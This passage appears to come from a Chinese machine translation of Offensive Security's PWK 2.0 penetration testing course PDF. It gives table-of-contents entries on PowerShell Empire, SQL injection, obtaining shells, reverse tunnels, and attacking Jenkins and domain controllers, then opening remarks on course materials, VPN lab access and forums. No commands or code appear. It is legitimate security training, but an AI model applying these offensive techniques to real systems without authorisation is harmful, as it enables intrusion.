<div style="position:absolute;top:16419;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">23.1.1 PowerShell Empire 语法 ..................................... ...................................................... . 725</font></font></nobr></div>
<div style="position:absolute;top:16445;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">23.1.2 监听器和 Stagers ...................................... ………………………………………………………………………………………………………………………………………………………… ...... 726</font></font></nobr></div>
<div style="position:absolute;top:16472;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">23.1.3 帝国特工 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................... 729</font></font></nobr></div>
<div style="position:absolute;top:16499;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">23.2 </font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell 模块 ..................................... …………………………………………………………………………………………………………………………………………………………………… ……………… 733</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:16526;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">23.2.1 态势感知 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...... 733</font></font></nobr></div>
<div style="position:absolute;top:16553;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">23.2.2 凭证和权限提升 ..................................... ...................................... 736</font></font></nobr></div>
<div style="position:absolute;top:16580;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">23.2.3 横向运动 ..................................... ………………………………………………………………………………………………………………………………………………………… ……………… 739</font></font></nobr></div>
<div style="position:absolute;top:16606;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">23.3</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Empire 和 Metasploit 之间切换 ..................................... ...................................... 741</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:16633;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">23.4</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">总结 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................... 744</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:16660;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:16660;left:163"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">组装零件：渗透测试细分 ..................................................... ...................... 745</font></font><font style="font-size:16px">	</font></nobr></div>
</span></font>

<div style="position:absolute;top:16807;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="15"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 15 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:16840;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:17917;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:17917;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:17917;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:16936;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.1</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">公网枚举 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...... 745</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:16963;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.2</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以 Web 应用程序为目标 ..................................... ………………………………………………………………………………………………………………………………………………………………………………………… ………………………………………………………… .. 746</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:16989;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.2.1 Web 应用枚举 ..................................... …………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………</font></font></nobr></div>
<div style="position:absolute;top:17016;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.2.2 SQL 注入利用 ..................................... ………………………………………………………………………………………………………………………………………………………… .. 755</font></font></nobr></div>
<div style="position:absolute;top:17043;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.2.3 破解密码 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...... 763</font></font></nobr></div>
<div style="position:absolute;top:17070;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.2.4 枚举管理界面 ..................................... ...................................... 765</font></font></nobr></div>
<div style="position:absolute;top:17097;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.2.5 获取Shell ..................................... ………………………………………………………………………………………………………………………………………………………………………………………… ………………………………………………………… ……………… 768</font></font></nobr></div>
<div style="position:absolute;top:17124;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.2.6 开发后枚举 ..................................... ...................................................... 775</font></font></nobr></div>
<div style="position:absolute;top:17150;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.2.7 创建稳定的枢轴点 ..................................................... ...................................................... 777</font></font></nobr></div>
<div style="position:absolute;top:17177;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.3</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以数据库为目标 ..................................... ………………………………………………………………………………………………………………………………………………………… ……………… 781</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:17204;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.3.1 枚举 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................... 781</font></font></nobr></div>
<div style="position:absolute;top:17231;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.3.2 尝试利用数据库...................................................... ...................................... 785</font></font></nobr></div>
<div style="position:absolute;top:17258;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.4 </font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Web 应用服务器的更深层次枚举............................................................ ……………… 789</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:17285;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.4.1 更彻底的后期利用 ..................................... ...................................... 789</font></font></nobr></div>
<div style="position:absolute;top:17312;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.4.2 权限提升 ..................................... …………………………………………………………………………………………………………………………………………………………………… ……………… 790</font></font></nobr></div>
<div style="position:absolute;top:17338;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.4.3 搜索数据库凭证 ..................................... ...................................................... 792</font></font></nobr></div>
<div style="position:absolute;top:17365;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.5</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">再次以数据库为目标 ..................................... …………………………………………………………………………………………………………………………………………………………………… ... 793</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:17392;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.5.1 漏洞利用 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................... 793</font></font></nobr></div>
<div style="position:absolute;top:17419;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.5.2 开发后枚举 ..................................... ...................................................... 796</font></font></nobr></div>
<div style="position:absolute;top:17446;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.5.3 创建稳定的反向隧道 ..................................... ...................................... 798</font></font></nobr></div>
<div style="position:absolute;top:17473;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.6 以</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">家禽为目标 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................... 800</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:17499;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.6.1 枚举 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................... 800</font></font></nobr></div>
<div style="position:absolute;top:17526;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.6.2 漏洞利用（或只是登录） ..................................... ...................................................... 802</font></font></nobr></div>
<div style="position:absolute;top:17553;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.6.3 开发后枚举 ..................................... ...................................................... 804</font></font></nobr></div>
<div style="position:absolute;top:17580;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.6.4 未加引号的搜索路径利用 ..................................... ...................................... 811</font></font></nobr></div>
<div style="position:absolute;top:17607;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.6.5 开发后枚举 ..................................... ...................................................... 816</font></font></nobr></div>
<div style="position:absolute;top:17633;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.7</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内部网络枚举 ..................................... ………………………………………………………………………………………………………………………………………………………… . 817</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:17660;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.7.1 查看结果 ..................................... ………………………………………………………………………………………………………………………………………………………… ...... 819</font></font></nobr></div>
<div style="position:absolute;top:17687;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.8</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以 Jenkins 服务器为目标 ..................................... …………………………………………………………………………………………………………………………………………………………………… …… 824</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:17714;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.8.1 应用枚举 ..................................... …………………………………………………………………………………………………………………………………………………………………… ... 825</font></font></nobr></div>
<div style="position:absolute;top:17741;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.8.2 利用 Jenkins ...................................... …………………………………………………………………………………………………………………………………………………………………… ...................... 831</font></font></nobr></div>
<div style="position:absolute;top:17768;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.8.3 漏洞利用后枚举 ..................................... ...................................................... 840</font></font></nobr></div>
<div style="position:absolute;top:17794;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.8.4 权限提升 ..................................... ………………………………………………………………………………………………………………………………………………………… ……………… 842</font></font></nobr></div>
<div style="position:absolute;top:17821;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.8.5 漏洞利用后枚举 ..................................... ...................................................... 845</font></font></nobr></div>
<div style="position:absolute;top:17848;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.9</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以域控制器为目标 ..................................... ...................................................... 847</font></font><font style="font-size:16px">	</font></nobr></div>
</span></font>

<div style="position:absolute;top:17995;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="16"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 16 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:18028;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:19105;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:19105;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:19105;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:18124;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.9.1 利用域控制器 ..................................... ...................................................... 847</font></font></nobr></div>
<div style="position:absolute;top:18151;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.10</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:18151;left:199"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包起来 ................................................ ………………………………………………………………………………………………………………………………………………………… ...................................... 851</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:18177;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">25.</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:18177;left:163"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更努力：实验室 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................... 852</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:18204;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">25.1</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现实生活模拟 ..................................... …………………………………………………………………………………………………………………………………………………………………… ……………… 852</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:18231;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">25.2</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器依赖 ..................................... …………………………………………………………………………………………………………………………………………………………………… ……………… 852</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:18258;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">25.3</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">解锁网络 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................... 852</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:18285;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">25.4</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">路由 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................... 853</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:18312;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">25.5</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器排序和攻击向量 ..................................... ...................................................... 853</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:18338;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">25.6</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">防火墙/路由器/NAT ..................................... ...................................................... ……………… 853</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:18365;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">25.7</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................... 853</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:18392;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">25.8</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">总结 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................................... 853</font></font><font style="font-size:16px">	</font></nobr></div>
</span></font>

<div style="position:absolute;top:19183;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="17"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 17 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:19216;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:20293;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:20293;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:20293;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:19306;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.1.1.1.1</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:25px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:19331;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. Kali Linux 渗透测试：通用课程</font></font></nobr></div>
<div style="position:absolute;top:19363;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:19408;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">欢迎来到 Kali Linux (PWK) 渗透测试课程！</font></font></nobr></div>
<div style="position:absolute;top:19441;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 是为系统和网络管理员以及安全专业人员创建的</font></font></nobr></div>
<div style="position:absolute;top:19460;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">喜欢认真而有意义地踏入专业渗透测试的世界。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:19480;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">课程将帮助您更好地了解恶意软件使用的攻击和技术</font></font></nobr></div>
<div style="position:absolute;top:19499;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实体对抗网络。</font><font style="vertical-align: inherit;">恭喜你迈出了第一步。</font><font style="vertical-align: inherit;">我们很高兴你在这里。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:19536;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.1 关于PWK课程</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:19578;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们花点时间回顾一下课程本身及其每个单独的组成部分。</font><font style="vertical-align: inherit;">你应该</font></font></nobr></div>
<div style="position:absolute;top:19597;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在可以访问以下内容：</font></font></nobr></div>
<div style="position:absolute;top:19630;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:19630;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK课程资料</font></font></nobr></div>
<div style="position:absolute;top:19658;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:19658;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">访问内部 VPN 实验室网络</font></font></nobr></div>
<div style="position:absolute;top:19687;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:19687;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">学生论坛凭证</font></font></nobr></div>
<div style="position:absolute;top:19715;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:19715;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现场支持</font></font></nobr></div>
<div style="position:absolute;top:19743;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:19743;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">OSCP 考试尝试</font></font></nobr></div>
<div style="position:absolute;top:19777;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们回顾一下这些项目中的每一个。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:19811;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.1.1 PWK课程资料</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:19849;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该课程包括此 PDF 格式的实验指南和随附的课程视频。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:19868;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PDF 中涵盖的信息和视频重叠，这意味着您可以阅读实验室指南和</font></font></nobr></div>
<div style="position:absolute;top:19887;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后观看视频以填补任何空白，反之亦然。</font><font style="vertical-align: inherit;">在某些模块中，实验室指南更多</font></font></nobr></div>
<div style="position:absolute;top:19907;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">比视频详细。</font><font style="vertical-align: inherit;">在其他情况下，视频可能比视频更好地传达一些信息</font></font></nobr></div>
<div style="position:absolute;top:19926;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指导。</font><font style="vertical-align: inherit;">密切关注两者很重要。</font></font></nobr></div>
<div style="position:absolute;top:19959;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实验室指南还包含每章末尾的练习。</font><font style="vertical-align: inherit;">完成课程练习</font></font></nobr></div>
<div style="position:absolute;top:19978;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当您尝试发现和利用系统中的漏洞时，将帮助您提高效率</font></font></nobr></div>
<div style="position:absolute;top:19998;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实验室机器。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:20032;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.1.2 访问内部VPN实验室网络</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:20070;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您在课程开始日期收到的电子邮件欢迎包包括您的 VPN</font></font></nobr></div>
<div style="position:absolute;top:20089;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">凭据和相应的 VPN 连接包。</font><font style="vertical-align: inherit;">这些将使您能够访问</font></font></nobr></div>
<div style="position:absolute;top:20109;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内部 VPN 实验室网络，您将在其中花费大量时间。</font></font></nobr></div>
<div style="position:absolute;top:20141;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实验时间从您的课程开始时开始，并按持续访问进行计量。</font><font style="vertical-align: inherit;">实验室时间只能</font></font></nobr></div>
<div style="position:absolute;top:20161;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在紧急情况下暂停。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:20243;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2019 年），https://www.offensive-security.com/faq/#can-pause-lab</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:20371;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="18"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 18 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:20404;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:21481;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:21481;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:21481;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:20500;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果您的实验室时间到期或即将到期，您可以随时购买实验室延期。</font><font style="vertical-align: inherit;">至</font></font></nobr></div>
<div style="position:absolute;top:20519;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">购买额外的实验室时间，使用发送到您的电子邮件的个性化购买链接</font></font></nobr></div>
<div style="position:absolute;top:20538;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">地址。</font><font style="vertical-align: inherit;">如果您在实验室访问权限仍处于活动状态时购买了实验室扩展，则可以继续</font></font></nobr></div>
<div style="position:absolute;top:20558;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用相同的 VPN 连接包。</font><font style="vertical-align: inherit;">如果您在现有实验室访问权限后购买实验室扩展</font></font></nobr></div>
<div style="position:absolute;top:20577;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已结束，您将收到一个新的 VPN 连接包。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:20612;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.1.3 进攻安全学生论坛</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:20650;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">学生论坛</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仅供进攻安全学生访问。</font><font style="vertical-align: inherit;">您的论坛凭据是</font></font></nobr></div>
<div style="position:absolute;top:20669;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">也是电子邮件欢迎包的一部分。</font><font style="vertical-align: inherit;">当您的实验时间结束时，访问权限不会过期。</font><font style="vertical-align: inherit;">你可以</font></font></nobr></div>
<div style="position:absolute;top:20688;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在您通过 OSCP 考试后很长时间内继续享受论坛。</font></font></nobr></div>
<div style="position:absolute;top:20721;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在论坛上，你可以提问，分享有趣的资源，并提供提示（只要有</font></font></nobr></div>
<div style="position:absolute;top:20740;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">没有剧透）。</font><font style="vertical-align: inherit;">我们要求所有论坛成员注意他们发布的内容，特别注意</font></font></nobr></div>
<div style="position:absolute;top:20760;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不要通过发布完整的解决方案来破坏其他人的整体课程体验。</font><font style="vertical-align: inherit;">不体贴</font></font></nobr></div>
<div style="position:absolute;top:20779;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帖子可能会被审核。</font></font></nobr></div>
<div style="position:absolute;top:20812;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">除了其他学生的帖子外，您还会发现其他资源可以帮助澄清</font></font></nobr></div>
<div style="position:absolute;top:20831;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">课程中提出的概念。</font><font style="vertical-align: inherit;">这些包括实验室子集的详细演练</font></font></nobr></div>
